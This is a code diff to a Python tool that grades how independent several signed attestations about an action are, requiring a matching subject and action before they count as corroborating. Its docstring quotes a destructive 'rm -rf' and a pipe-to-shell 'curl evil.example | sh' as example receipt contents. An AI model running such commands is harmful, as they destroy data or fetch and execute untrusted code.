@@ -239,6 +239,57 @@ def extract_subject(receipt: Dict[str, Any]) -> Optional[str]:
     return None
 
 
+_NO_ACTION = object()
+
+
+def extract_action(receipt: Dict[str, Any]):
+    """
+    The action the receipt is ABOUT, as written. Returns _NO_ACTION when the
+    receipt names none, which is distinct from naming a null one.
+
+    Read from the receipt for the same reason the subject is: there is nowhere
+    else it could come from. Used only as a comparison target between
+    attestations, never as a source of conclusions about any one of them.
+    """
+    for path in (("payload", "action"), ("action",), ("payload", "action_ref"),
+                 ("payload", "event"), ("payload", "operation")):
+        node = receipt
+        for part in path:
+            if not isinstance(node, dict) or part not in node:
+                node = _NO_ACTION
+                break
+            node = node[part]
+        if node is not _NO_ACTION:
+            return node
+    return _NO_ACTION
+
+
+def corroboration_key(receipt: Dict[str, Any]):
+    """
+    The identity of the event an attestation testifies about: the pair
+    (subject, action), canonicalised so that two dicts written in different key
+    orders are one key.
+
+    Returns None when either half is missing. A receipt that names no action
+    cannot be shown to be about the same action as anything else, and the
+    honest consequence of that is exclusion from corroboration rather than a
+    default that lets it join.
+
+    Comparison here is exact, deliberately unlike the host comparison in C5.
+    The two comparisons fail in opposite directions. In C5 a missed match
+    means a self-anchored receipt is called independent, so that comparison
+    normalises aggressively. Here a missed match means two attestations that
+    were about one event are treated as two, which costs a level that was
+    real but claims nothing that is not. A spurious match is the expensive
+    error, so the strict comparison is the safe one.
+    """
+    subject = extract_subject(receipt)
+    action = extract_action(receipt)
+    if subject is None or action is _NO_ACTION:
+        return None
+    return _jcs([subject, action])
+
+
 def find_self_asserted_independence(receipt: Dict[str, Any]) -> List[str]:
     found = []
 
@@ -472,31 +523,125 @@ def grade_set(receipts: List[Dict[str, Any]], store: AnchorStore,
               graph: OperatorGraph, profile=None) -> Dict[str, Any]:
     """
     Grade a set of attestations over one action. W4 requires two or more W3
-    attestations whose anchors do not share a root, computed as a transitive
-    closure rather than by counting distinct kid values.
+    attestations ABOUT THE SAME EVENT whose anchors do not share a root,
+    computed as a transitive closure rather than by counting distinct kid
+    values.
+
+    The spec is explicit that the set is over one thing. Section 3 defines W4
+    as "Two or more W3 attestations over the same action whose anchors do not
+    share a controller," and section 4 lists E3 as "The subject identifier the
+    receipt names, used only as the value to compare against."
+
+    This function used to check only the second half of that sentence. Two W3
+    attestations with distinct roots reached W4 whatever they were about, so a
+    receipt denying `rm -rf` and an unrelated receipt allowing
+    `curl evil.example | sh` were reported as corroborating each other at the
+    top of the scale. They corroborate nothing. They are two separate facts,
+    and calling two separate facts the strongest available assurance is the
+    exact failure this scale was written to describe, committed by the tool
+    that describes it.
+
+    The event identity is the pair (subject, action), not the action alone.
+    The spec's sentence names the action, but every level below W4 is a
+    relation between an anchor controller and a SUBJECT: W3 means "neither is
+    nor operates the subject." A W3 verdict is therefore only meaningful
+    relative to one subject, and two W3s about two different subjects are two
+    findings about two different relationships. The same shell command run by
+    two different agents is two events, so the subject is part of what makes
+    the action the same action.
+
+    `decision` is compared and reported but deliberately does not gate the
+    level. Section 7 is direct that WIL "does not measure whether an action
+    was correct ... A W4 result from four corroborating witnesses who are all
+    wrong is four wrong witnesses." Two witnesses that disagree about the
+    verdict are still two independent witnesses to the same event, which is
+    what this scale measures. A caller that cares about the disagreement can
+    read it off C8b rather than have it silently folded into a number.
+
+    When the attestations do not concern the same event, the result is the
+    highest individual level, not W2? undetermined. W2? has a specific
+    meaning: independence was not established. Here it was, per attestation,
+    on the ordinary evidence. Reporting W2? would trade one false statement
+    for another one and lose a true finding on the way. The correct answer is
+    to decline the promotion and report exactly what was shown, which for two
+    genuine W3 attestations about different events is W3.
     """
     graded = [grade_one(r, store, graph, profile) for r in receipts]
-    independent = [g for g in graded if g["level"] == W3]
+    independent = [(g, r) for g, r in zip(graded, receipts) if g["level"] == W3]
 
-    roots = {}
-    for g in independent:
+    # Root closure per event, so that corroboration is counted only among
+    # attestations that testify about the same thing.
+    events: Dict[Any, Dict[str, List[str]]] = {}
+    unkeyed = 0
+    for g, r in independent:
+        key = corroboration_key(r)
+        if key is None:
+            unkeyed += 1
+            continue
         c = g["anchor_controller"]
         if c:
-            roots.setdefault(graph.root_of(c), []).append(c)
+            events.setdefault(key, {}).setdefault(graph.root_of(c), []).append(c)
 
-    corroborated = len(roots) >= 2
-    set_check = Check(
-        id="C8",
-        question="Do two or more independent attestations rest on distinct roots of trust?",
-        outcome=(f"{len(roots)} distinct roots across {len(independent)} independent "
-                 f"attestations: {sorted(roots)}"),
-        reads=[Fact("E4_root_closure", {k: v for k, v in roots.items()}, OBSERVED,
-                    "transitive closure over anchor controllers; two distinct kid "
-                    "values served by one controller count as one witness"),
-               Fact("D1_shared_roots", graph.shared_roots,
-                    DECLARED if graph.shared_roots else ABSENT,
-                    "declared groupings of controllers that share a root")],
-    )
+    corroborating = {k: v for k, v in events.items() if len(v) >= 2}
+    corroborated = bool(corroborating)
+
+    # Reported for the whole set so the flat root count stays visible; it is
+    # no longer what decides the level.
+    all_roots: Dict[str, List[str]] = {}
+    for g, _ in independent:
+        c = g["anchor_controller"]
+        if c:
+            all_roots.setdefault(graph.root_of(c), []).append(c)
+
+    subjects = sorted({s for s in (g["subject"] for g, _ in independent) if s})
+    actions = [a for a in (extract_action(r) for _, r in independent)
+               if a is not _NO_ACTION]
+    decisions = sorted({d for d in ((r.get("payload") or {}).get("decision")
+                                    for _, r in independent) if d})
+
+    set_checks = [
+        Check(
+            id="C8",
+            question=("Do two or more independent attestations ABOUT THE SAME EVENT "
+                      "rest on distinct roots of trust?"),
+            outcome=(f"{len(events)} distinct event(s) across {len(independent)} "
+                     f"independent attestations; "
+                     + (f"{len(corroborating)} event(s) carry two or more distinct roots"
+                        if corroborated else
+                        "no single event carries two or more distinct roots")
+                     + (f"; {unkeyed} attestation(s) named no comparable subject and "
+                        f"action and were excluded" if unkeyed else "")),
+            reads=[Fact("E4_root_closure", [dict(v) for v in events.values()],
+                        OBSERVED,
+                        "transitive closure over anchor controllers, computed within "
+                        "each event; two distinct kid values served by one controller "
+                        "count as one witness"),
+                   Fact("E4_roots_ignoring_event", all_roots, OBSERVED,
+                        "the flat root count over the whole set, reported because it "
+                        "used to be the whole test and is no longer sufficient"),
+                   Fact("D1_shared_roots", graph.shared_roots,
+                        DECLARED if graph.shared_roots else ABSENT,
+                        "declared groupings of controllers that share a root")],
+        ),
+        Check(
+            id="C8b",
+            question="Do the independent attestations concern the same subject and action?",
+            outcome=("yes" if len(events) == 1 and not unkeyed else
+                     f"no; {len(events)} distinct (subject, action) pair(s)"
+                     + (f" and {unkeyed} attestation(s) with no comparable pair"
+                        if unkeyed else "")),
+            reads=[Fact("E3_subjects", subjects, OBSERVED if subjects else ABSENT,
+                        "the subjects the receipts name, compared against each other "
+                        "only, exactly and without normalisation"),
+                   Fact("E3_actions", actions, OBSERVED if actions else ABSENT,
+                        "the actions the receipts name, compared as canonical bytes so "
+                        "key order cannot split one action into two"),
+                   Fact("E3_decisions", decisions, OBSERVED if decisions else ABSENT,
+                        "recorded for the reader; a disagreement here is visible but "
+                        "does not move the level, because WIL measures custody "
+                        "distance and not whether a witness is right")],
+        ),
+    ]
 
     top = W4 if corroborated else (max((g["level"] for g in graded),
                                        key=ORDER.index, default=W0))
@@ -506,7 +651,7 @@ def grade_set(receipts: List[Dict[str, Any]], store: AnchorStore,
         "set_level": top,
         "set_label": LABELS[top],
         "attestations": graded,
-        "set_checks": [set_check.to_dict()],
+        "set_checks": [c.to_dict() for c in set_checks],
         "contains_declared_input": any(g["contains_declared_input"] for g in graded)
-                                   or set_check.any_declared,
+                                   or any(c.any_declared for c in set_checks),
     }
